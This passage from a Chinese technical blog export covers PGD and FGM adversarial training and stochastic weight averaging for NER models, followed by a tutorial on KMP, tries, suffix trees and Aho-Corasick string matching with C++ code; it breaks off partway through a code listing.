emb_name=<span class="hljs-string">'emb.'</span>,</span></span><br><span class="hljs-function"><span class="hljs-params">               is_first_attack=False)</span>:</span><br>        <span class="hljs-keyword">for</span> name, param <span class="hljs-keyword">in</span> self.model.named_parameters():<br>            <span class="hljs-keyword">if</span> param.requires_grad <span class="hljs-keyword">and</span> emb_name <span class="hljs-keyword">in</span> name:<br>                <span class="hljs-keyword">if</span> is_first_attack:<br>                    self.emb_backup[name] = param.data.clone()<br>                norm = torch.norm(param.grad)<br>                <span class="hljs-keyword">if</span> norm != <span class="hljs-number">0</span> <span class="hljs-keyword">and</span> <span class="hljs-keyword">not</span> torch.isnan(norm):<br>                    r_at = alpha * param.grad / norm<br>                    param.data.add_(r_at)<br>                    param.data = self.project(name, param.data, epsilon)<br><br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">restore</span><span class="hljs-params">(self, emb_name=<span class="hljs-string">'emb.'</span>)</span>:</span><br>        <span class="hljs-comment"># emb_name这个参数要换成你模型中embedding的参数名</span><br>        <span class="hljs-keyword">for</span> name, param <span class="hljs-keyword">in</span> self.model.named_parameters():<br>            <span class="hljs-keyword">if</span> param.requires_grad <span class="hljs-keyword">and</span> emb_name <span class="hljs-keyword">in</span> name:<br>                <span class="hljs-keyword">assert</span> name <span class="hljs-keyword">in</span> self.emb_backup<br>                param.data = self.emb_backup[name]<br>        self.emb_backup = &#123;&#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">project</span><span class="hljs-params">(self, param_name, param_data, epsilon)</span>:</span><br>        r = param_data - self.emb_backup[param_name]<br>        <span class="hljs-keyword">if</span> torch.norm(r) &gt; epsilon:<br>            r = epsilon * r / torch.norm(r)<br>        <span class="hljs-keyword">return</span> self.emb_backup[param_name] + r<br><br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">backup_grad</span><span class="hljs-params">(self)</span>:</span><br>        <span class="hljs-comment"># 此处也可以直接用一个成员变量储存 grad，而不用 register_hook 存储在全局变量中</span><br>        <span class="hljs-keyword">for</span> name, param <span class="hljs-keyword">in</span> self.model.named_parameters():<br>            <span class="hljs-keyword">if</span> param.requires_grad:<br>                param.register_hook(save_grad(name))<br><br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">restore_grad</span><span class="hljs-params">(self)</span>:</span><br>        <span class="hljs-keyword">for</span> name, param <span class="hljs-keyword">in</span> self.model.named_parameters():<br>            <span class="hljs-keyword">if</span> param.requires_grad:<br>                param.grad = grad_backup[name]<br><br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">'__main__'</span>:<br>    <span class="hljs-comment"># 示例过程</span><br>    pgd = PGD(model)<br>    K = <span class="hljs-number">3</span> <span class="hljs-comment"># 小步走的步数</span><br>    <span class="hljs-keyword">for</span> batch_input, batch_label <span class="hljs-keyword">in</span> data:<br>        <span class="hljs-comment"># 正常训练</span><br>        loss = model(batch_input, batch_label)<br>        loss.backward() <span class="hljs-comment"># 反向传播，得到正常的grad</span><br>        pgd.backup_grad()<br><br>        <span class="hljs-comment"># 对抗训练</span><br>        <span class="hljs-keyword">for</span> t <span class="hljs-keyword">in</span> range(K):<br>            pgd.attack(is_first_attack=(t==<span class="hljs-number">0</span>)) <span class="hljs-comment"># 在embedding上添加对抗扰动, first attack时备份param.data</span><br>            <span class="hljs-keyword">if</span> t != K<span class="hljs-number">-1</span>:<br>                model.zero_grad()<br>            <span class="hljs-keyword">else</span>:<br>                pgd.restore_grad()<br>            loss_adv = model(batch_input, batch_label)<br>            loss_adv.backward() <span class="hljs-comment"># 反向传播，并在正常的grad基础上，累加对抗训练的梯度</span><br>        pgd.restore() <span class="hljs-comment"># 恢复embedding参数</span><br><br>        <span class="hljs-comment"># 梯度下降，更新参数</span><br>        optimizer.step()<br>        model.zero_grad()<br></code></pre></div></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">import</span> torch<br><br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">FGM</span>:</span><br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__init__</span><span class="hljs-params">(self, model)</span>:</span><br>        self.model = model<br>        self.backup = &#123;&#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">attack</span><span class="hljs-params">(self, epsilon=<span class="hljs-number">1</span>, emb_name=<span class="hljs-string">'emb.'</span>)</span>:</span><br>        <span class="hljs-keyword">for</span> name, param <span class="hljs-keyword">in</span> self.model.named_parameters():<br>            <span class="hljs-keyword">if</span> param.requires_grad <span class="hljs-keyword">and</span> emb_name <span class="hljs-keyword">in</span> name:<br>                self.backup[name] = param.data.clone()<br>                norm = torch.norm(param.grad)<br>                <span class="hljs-keyword">if</span> norm != <span class="hljs-number">0</span> <span class="hljs-keyword">and</span> <span class="hljs-keyword">not</span> torch.isnan(norm):<br>                    r_adv = epsilon * param.grad / norm<br>                    param.data.add_(r_adv)<br><br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">restore</span><span class="hljs-params">(self, emb_name=<span class="hljs-string">'emb.'</span>)</span>:</span><br>        <span class="hljs-keyword">for</span> name, param <span class="hljs-keyword">in</span> self.model.named_parameters():<br>            <span class="hljs-keyword">if</span> param.requires_grad <span class="hljs-keyword">and</span> emb_name <span class="hljs-keyword">in</span> name:<br>                <span class="hljs-keyword">assert</span> name <span class="hljs-keyword">in</span> self.backup<br>                param.data = self.backup[name]<br>        self.backup = &#123;&#125;<br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">"__main__"</span>:<br>    <span class="hljs-comment"># 示例过程</span><br>    fgm = FGM(model)<br>    <span class="hljs-keyword">for</span> batch_input, batch_label <span class="hljs-keyword">in</span> data:<br>        <span class="hljs-comment"># 正常训练</span><br>        loss = model(batch_input, batch_label)<br>        loss.backward()  <span class="hljs-comment"># 反向传播，得到正常的grad</span><br>        <span class="hljs-comment"># 对抗训练</span><br>        fgm.attack()  <span class="hljs-comment"># 在embedding上添加对抗扰动</span><br>        loss_adv = model(batch_input, batch_label)<br>        loss_adv.backward()  <span class="hljs-comment"># 反向传播，并在正常的grad基础上，累加对抗训练的梯度</span><br>        fgm.restore()  <span class="hljs-comment"># 恢复embedding参数</span><br>        <span class="hljs-comment"># 梯度下降，更新参数</span><br>        optimizer.step()<br>        model.zero_grad()<br></code></pre></div></td></tr></table></figure><h3><span id="swa">SWA</span></h3><p>Stochastic WeightAveraging，方法的提出者认为，训练期间得到的局部最小值 倾向于在损失值较低的区域的边界，而不是集中在损失更低的区域中心部分。所以，StochasticWeightAveraging可以通过对边界的平均，得到更好性能和更好泛化性能的模型。<a href="https://github.com/timgaripov/swa">Git Repo</a></p><blockquote><ol type="1"><li><p>保存两套权重w, wswa；</p></li><li><p>使用循环学习率，训练w；</p></li><li><p>达到指定轮次，更新ws，<span class="math inline">\(n_{models}\)</span>指更新<span class="math inline">\(w_{swa}\)</span>时，中间间隔的轮次:</p><p><span class="math inline">\(w_{swa} =\frac{w_{swa}n_{models}+w}{n_{models}+1}\)</span></p></li><li><p>循环以上步骤，最后使用wswa，作为最终模型</p></li></ol></blockquote><p>有可以直接使用的工具，比较方便。~<em>from</em> torchcontrib.optim<em>import</em> SWA~</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python">optimizer = torch.optim.Adam(params_lr)<br><span class="hljs-comment"># Stochastic Weight Averaging</span><br>optimizer = SWA(optimizer)<br><br><br><span class="hljs-keyword">if</span> ...:<br>    optimizer.update_swa()<br>    <br>...<br><span class="hljs-comment"># 训练结束时使用收集到的swa moving average</span><br>optimizer.swap_swa_sgd()<br><span class="hljs-comment"># optimizer.bn_update(</span><br><span class="hljs-comment">#     train_dataloader,</span><br><span class="hljs-comment">#     model)  # 更新BatchNorm的 running mean</span><br><br><span class="hljs-comment"># save</span><br></code></pre></div></td></tr></table></figure><p>参考链接：</p><p><a href="https://github.com/BaberMuyu/2020CCF-NER">2020CCF-NER</a></p><p><a href="https://github.com/LeeSureman/Flat-Lattice-Transformer">Flat-Lattice-Transformer</a></p>]]></content>
      
      
      <categories>
          
          <category> Notes </category>
          
          <category> NLP </category>
          
      </categories>
      
      
        <tags>
            
            <tag> NER </tag>
            
            <tag> FLAT </tag>
            
            <tag> methodology </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>字符串匹配从KMP到AC自动机</title>
      <link href="/posts/51024bbf.html"/>
      <url>/posts/51024bbf.html</url>
      
        <content type="html"><![CDATA[<h2><span id="knuth-morris-pratt"><strong>Knuth-Morris-Pratt</strong></span></h2><p>在一个字符串<code>S</code>内查找一个词<code>W</code>的出现位置。KMP目的是什么？比如是暴力匹配（两个for循环）最坏的情况，O(m*n)：</p><figure class="highlight avrasm"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs avrasm"><span class="hljs-symbol">S:</span> aaaaaaaaaaaaaa<br><span class="hljs-symbol">W:</span> aaab<br></code></pre></div></td></tr></table></figure><p>想法，不匹配就只是个结果，没有其它信息产生吗？显然，如果有一部分匹配，后续搜索应该可以利用。</p><p>怎么利用？</p><p>首先，有一部分匹配，才可以操作，才有多的信息嘛。</p><p>那么，目的就是保证已经匹配的部分，在S中，不再重复匹配。</p><figure class="highlight avrasm"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs avrasm"><span class="hljs-symbol">S:</span> aaaaaababaaaaa<br><span class="hljs-symbol">W:</span> ababc<br></code></pre></div></td></tr></table></figure><p>比如，上例，abab匹配，c不匹配，重新回退4个位置匹配吗？W的信息我们是知道的，这末端abc不匹配，里面还有aba啊，并且从S当前匹配的信息，发现aba，已经再次匹配，S的指针不需要回退！</p><p>现在的问题，是W的信息怎么表示？需要什么信息？部分子串前缀和后缀相同的信息。</p><p>只需要一个数组，告诉我们，当出现不匹配字符时，可以跳过那些重复的一定会再次匹配的部分。</p><p>现在，问题就是：找到 W 对应的回退数组N，顺序匹配 S 与 W，按照 N的信息回退。</p><p>时间复杂度：O(|S|+|W|)</p><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;vector&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;string&gt;</span></span><br><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> <span class="hljs-built_in">std</span>;<br><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">get_backoff</span><span class="hljs-params">(<span class="hljs-built_in">string</span> &amp;pattern, <span class="hljs-built_in">vector</span>&lt;<span class="hljs-keyword">int</span>&gt; &amp;book)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">1</span>, j = <span class="hljs-number">0</span>; i &lt; (<span class="hljs-keyword">int</span>)pattern.<span class="hljs-built_in">size</span>(); i++)<br>    &#123;<br>        <span class="hljs-keyword">while</span> (j &amp;&amp; pattern[i] != pattern[j])<br>        &#123;<br>            <span class="hljs-comment">// 不匹配，回退到上一个相同前缀</span><br>            j = book[j - <span class="hljs-number">1</span>];<br>        &#125;<br>        <span class="hljs-comment">// 匹配，更新相同的前缀的最后一个index</span><br>        <span class="hljs-keyword">if</span> (pattern[i] == pattern[j])<br>            j++;<br><br>        <span class="hljs-comment">// 更新book，记录相同的前缀的最后一个index</span><br>        book[i] = j;<br>    &#125;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">kmp</span><span class="hljs-params">(<span class="hljs-built_in">string</span> &amp;s, <span class="hljs-built_in">string</span> &amp;p, <span class="hljs-keyword">int</span> <span class="hljs-built_in">begin</span>)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">int</span> res = <span class="hljs-number">-1</span>;<br>    <span class="hljs-function"><span class="hljs-built_in">vector</span>&lt;<span class="hljs-keyword">int</span>&gt; <span class="hljs-title">book</span><span class="hljs-params">(p.<span class="hljs-built_in">size</span>())</span></span>;<br><br>    get_backoff(p, book);<br><br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-built_in">begin</span>, j = <span class="hljs-number">0</span>; i &lt; (<span class="hljs-keyword">int</span>)s.<span class="hljs-built_in">size</span>(); ++i)<br>    &#123;<br>        <span class="hljs-keyword">while</span> (j &amp;&amp; s[i] != p[j]) <span class="hljs-comment">// 回退p</span><br>            j = book[j - <span class="hljs-number">1</span>];<br>        <span class="hljs-keyword">if</span> (s[i] == p[j])<br>            j++;<br>        <span class="hljs-keyword">if</span> (j == (<span class="hljs-keyword">int</span>)p.<span class="hljs-built_in">size</span>())<br>        &#123;<br>            res = i - p.<span class="hljs-built_in">size</span>() + <span class="hljs-number">1</span>;<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">return</span> res;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">int</span> argc, <span class="hljs-keyword">char</span> *argv[])</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-built_in">string</span> s = <span class="hljs-string">"abskajakajkafkkakaj"</span>;<br>    <span class="hljs-built_in">string</span> p = <span class="hljs-string">"kkakaj"</span>;<br><br>    <span class="hljs-built_in">string</span> pre = <span class="hljs-string">"abskajakajkaf"</span>;<br><br>    <span class="hljs-built_in">cout</span> &lt;&lt; kmp(s, p, <span class="hljs-number">0</span>) &lt;&lt; <span class="hljs-built_in">endl</span>;<br>    <span class="hljs-built_in">cout</span> &lt;&lt; pre.<span class="hljs-built_in">size</span>() &lt;&lt; <span class="hljs-built_in">endl</span>;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></div></td></tr></table></figure><h2><span id="trie前缀树或字典树">Trie前缀树或字典树</span></h2><p>从头到尾，使用输入串中的一个字符来确定要进入的下一个状态。选择标记有相同字符的边缘以行走。每一步都消耗一个字符。</p><p>一个节点的所有子孙都有相同的前缀，也就是这个节点对应的字符。</p><p><img src="https://cdn.jsdelivr.net/gh/racleray/image_storage/images/pic/KMP_pic/image-20210227193218134.png" srcset="/img/loading.gif" lazyload alt style="zoom:50%;"></p><p>有什么强的？</p><p>从根到叶遍历所需的时间不取决于数据库的大小，而是与键的长度成比例。因此，在一般情况下，它通常比B树或任何基于比较的索引方法快得多。它的时间复杂度与哈希技术相当。</p><p>除了效率外，在拼写错误的情况下，trie还提供了搜索最近路径的灵活性。</p><p>能做什么？</p><p>多patttern匹配</p><p>比如，你有<strong>很多个pattern</strong>，要同时在一个strings中查找，是否出现。使用Trie保存pattern，作为索引，在string中搜索，可以加快效率。</p><p><img src="https://cdn.jsdelivr.net/gh/racleray/image_storage/images/pic/KMP_pic/image-20210227193710919.png" srcset="/img/loading.gif" lazyload alt style="zoom:50%;"></p><p><img src="https://cdn.jsdelivr.net/gh/racleray/image_storage/images/pic/KMP_pic/image-20210227193736017.png" srcset="/img/loading.gif" lazyload alt style="zoom:40%;"></p><p><img src="https://cdn.jsdelivr.net/gh/racleray/image_storage/images/pic/KMP_pic/image-20210227193758057.png" srcset="/img/loading.gif" lazyload alt style="zoom:40%;"></p><p><img src="https://cdn.jsdelivr.net/gh/racleray/image_storage/images/pic/KMP_pic/image-20210227193848847.png" srcset="/img/loading.gif" lazyload alt style="zoom:40%;"></p><p>。。。</p><p><img src="https://cdn.jsdelivr.net/gh/racleray/image_storage/images/pic/KMP_pic/image-20210227193946401.png" srcset="/img/loading.gif" lazyload alt style="zoom:40%;"></p><blockquote><p>brute force需要 O(|Text| *|Patterns|)</p><p>Trie需要 O(|Text| * |Len of Longest Pattern|) 加上构造 Trie 的O(|Patterns|)。</p><p>需要额外空间复杂度，O(|Patterns|)。</p></blockquote><p>怎么实现？</p><p><img src="https://cdn.jsdelivr.net/gh/racleray/image_storage/images/pic/KMP_pic/image-20210227200042977.png" srcset="/img/loading.gif" lazyload alt style="zoom:30%;"></p><p>最基础的实现方式如上图。实现：</p><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;bits/stdc++.h&gt;</span></span><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> <span class="hljs-built_in">std</span>;<br><br><span class="hljs-keyword">int</span> trie[STACSIZE][N]; <span class="hljs-comment">//手动开辟栈空间</span><br><span class="hljs-comment">// 或者</span><br><span class="hljs-comment">// vector&lt;map&lt;char,int&gt;&gt; trie[STACSIZE][N]; //手动开辟栈空间</span><br><span class="hljs-comment">// 或者</span><br><span class="hljs-comment">// vector&lt;unordered_map&lt;char,int&gt;&gt; trie[STACSIZE][N]; //手动开辟栈空间</span><br><br><span class="hljs-keyword">int</span> counts[STACSIZE];  <span class="hljs-comment">//计数</span><br><span class="hljs-keyword">int</span> idx = <span class="hljs-number">0</span>;<br><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">insert</span><span class="hljs-params">(<span class="hljs-built_in">string</span> &amp;s)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">int</span> p = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; s.<span class="hljs-built_in">size</span>(); i++)<br>    &#123;<br>        <span class="hljs-keyword">int</span> c = s[i] - <span class="hljs-string">'a'</span>;<br>        <span class="hljs-keyword">if</span> (trie[p][c] == <span class="hljs-number">0</span>)<br>            trie[p][c] = ++idx; <span class="hljs-comment">//没有节点，创造节点，指定在栈空间的位置</span><br>        p = trie[p][c];         <span class="hljs-comment">//更新当前位置，进入c节点</span><br>    &#125;<br>    counts[p]++; <span class="hljs-comment">//更新计数</span><br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">query</span><span class="hljs-params">(<span class="hljs-built_in">string</span> &amp;s)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">int</span> p = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; s.<span class="hljs-built_in">size</span>(); i++)<br>    &#123;<br>        <span class="hljs-keyword">int</span> c = s[i] - <span class="hljs-string">'a'</span>;<br>        <span class="hljs-keyword">if</span> (!trie[p][c])<br>            <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>        p = trie[p][c];<br>    &#125;<br>    <span class="hljs-keyword">return</span> counts[p];<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">int</span> argc, <span class="hljs-keyword">char</span> **argv)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">5</span>; i++)<br>    &#123;<br>        <span class="hljs-built_in">string</span> s;<br>        <span class="hljs-built_in">cin</span> &gt;&gt; s;<br>        insert(s);<br>    &#125;<br><br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">5</span>; i++)<br>    &#123;<br>        <span class="hljs-built_in">string</span> s;<br>        <span class="hljs-built_in">cin</span> &gt;&gt; s;<br>        <span class="hljs-built_in">cout</span> &lt;&lt; query(s) &lt;&lt; <span class="hljs-built_in">endl</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></div></td></tr></table></figure><p>以上方法，就空间使用而言，这是相当奢侈的，因为在trie中，大多数节点只有几个分支，而大多数表单元格为空白。更紧凑的方案是使用链表存储每个状态的转换。但是由于是线性搜索，导致访问速度变慢。</p><p>因此，大佬设计出了快速访问的表压缩技术来解决该问题。</p><p>Double-ArrayTrie：包含base和check两个数组。base数组的每个元素表示一个Trie节点，即一个状态；check数组表示某个状态的前驱状态。</p><p><img src="https://cdn.jsdelivr.net/gh/racleray/image_storage/images/pic/KMP_pic/image-20210227203239999.png" srcset="/img/loading.gif" lazyload alt style="zoom:50%;"></p><p>示意图所示，构造两个数组，一个base对应一个前驱check。</p><p>一步状态转移逻辑为：</p><blockquote><p>t := base [ s ] + c ;</p><p>如果 check[ t ] = s， 则 next s := t</p><p>如果 check[ t ] = -s， 则 next s := t 且 t是一个终止状态（比如表示一个词的结尾）</p><p>否则 转移失败</p></blockquote><p>实现，就暂时不研究了。</p><h3><span id="more-about-多个pattern匹配">More about 多个pattern匹配</span></h3><p>除了Trie，还有针对 string s 建树的 Suffix Trie.</p><p>对 string：p a n a m a b a n an a s。构建后缀Trie</p><p><img src="https://cdn.jsdelivr.net/gh/racleray/image_storage/images/pic/KMP_pic/image-20210227204247991.png" srcset="/img/loading.gif" lazyload alt style="zoom:80%;"></p><p><img src="https://cdn.jsdelivr.net/gh/racleray/image_storage/images/pic/KMP_pic/image-20210227204406853.png" srcset="/img/loading.gif" lazyload alt style="zoom:67%;"></p><p>将 pattern 逐个输入，进行匹配。此时，不需要匹配到叶子节点。</p><p>额外空间复杂度，和 string s 有关。压缩无分支后缀之后，就成了SuffixTree。</p><p><img src="https://cdn.jsdelivr.net/gh/racleray/image_storage/images/pic/KMP_pic/image-20210227204848941.png" srcset="/img/loading.gif" lazyload alt style="zoom:67%;"></p><p>若再压缩空间，可以将suffix 变成 idx + length。</p><p><img src="https://cdn.jsdelivr.net/gh/racleray/image_storage/images/pic/KMP_pic/image-20210227205003068.png" srcset="/img/loading.gif" lazyload alt style="zoom:67%;"></p><p>额外空间复杂度为，O(|Text|)。使用 SuffixTrie，多pattern匹配的时间复杂度为：</p><p>O(|Text| + |Patterns|)，Trie 为 O(|Text| * |Len of LongestPattern|)。</p><p>额外空间复杂度为 O(|Text|)，Trie 为 O(|Patterns|)。只是 O(|Text|)的系数约为20，当文本很长时，还是算了吧。</p><h2><span id="ac自动机">AC自动机</span></h2><p>还是，多 pattern 匹配问题，在只是使用Trie，在strings上暴力遍历，只是寻找成功的那一刻，失败的匹配那都是没有意义的吗？</p><p>不不不，得让失败的存在，这东西越混沌，信息熵越高，有用。</p><p>AC自动机，Trie +KMP，加速多pattern匹配过程。匹配过程时间复杂度O（|Text| *Trie树高）。</p><blockquote><ol type="1"><li>构建 patterns 的 Trie</li><li>构建 fail 指针</li><li>开始匹配</li></ol></blockquote><h3><span id="构建-fail-指针">构建 fail 指针</span></h3><ol type="1"><li>在Trie中，BFS遍历，第一层，fail指针都指向 root</li><li>第一层之后，每个节点的 fail 指针，指向【<strong>该节点的父节点</strong>】 的【<strong>fail指针指向的节点</strong>】 的【<strong>儿子节点</strong>】中【<strong>和该节点（自己）同字符的节点</strong>】。如果没有找到，【<strong>fail指针指向的节点</strong>】继续向上找fail 节点，直到 root。</li></ol><p>啥是 fail ？ 当前单词的最长后缀。</p><p><img src="https://cdn.jsdelivr.net/gh/racleray/image_storage/images/pic/KMP_pic/image-20210227220403902.png" srcset="/img/loading.gif" lazyload alt style="zoom:50%;"></p><h3><span id="匹配过程">匹配过程</span></h3><ol type="1"><li>输入string s，trie从 root开始，进行匹配</li><li>当匹配失败，跳转到fail指针指向的节点，如果fail到root，输入此位置之后的string s的部分，继续查找。</li><li>当匹配成功（Trie标记的节点），也跳转到fail指针指向的节点，如果此时跳转到root，进行回溯到前一个最长的trie路径节点。</li></ol><p>跳转，就是在匹配后缀。</p><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span 